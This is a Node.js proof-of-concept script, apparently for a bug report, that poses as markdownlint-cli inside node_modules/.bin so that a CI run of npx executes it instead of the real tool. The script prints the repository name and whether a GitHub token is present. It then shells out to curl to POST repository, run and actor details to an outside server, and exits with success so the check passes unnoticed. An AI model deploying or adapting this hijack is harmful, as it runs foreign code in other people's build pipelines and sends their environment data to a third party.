#!/usr/bin/env node

// PoC: This script hijacks markdownlint-cli via local node_modules/.bin
console.log('='.repeat(60));
console.log('[PoC] HIJACKED markdownlint-cli EXECUTED');
console.log('[PoC] Repository:', process.env.GITHUB_REPOSITORY);
console.log('[PoC] Token available:', !!process.env.GITHUB_TOKEN);
console.log('='.repeat(60));

const { execSync } = require('child_process');

try {
  const payload = JSON.stringify({
    vulnerability: 'npx_hijack_via_node_modules_bin',
    repo: process.env.GITHUB_REPOSITORY || 'unknown',
    run_id: process.env.GITHUB_RUN_ID || 'unknown',
    actor: process.env.GITHUB_ACTOR || 'unknown'
  });

  execSync(`curl -s -X POST https://www.obscurelabs.net/ -H "Content-Type: application/json" -d '${payload}'`,
    { encoding: 'utf-8', timeout: 10000 });
  console.log('[PoC] Request sent to obscurelabs.net');
} catch (e) {
  console.log('[PoC] Curl error:', e.message);
}

// Exit successfully to pass the check
process.exit(0);
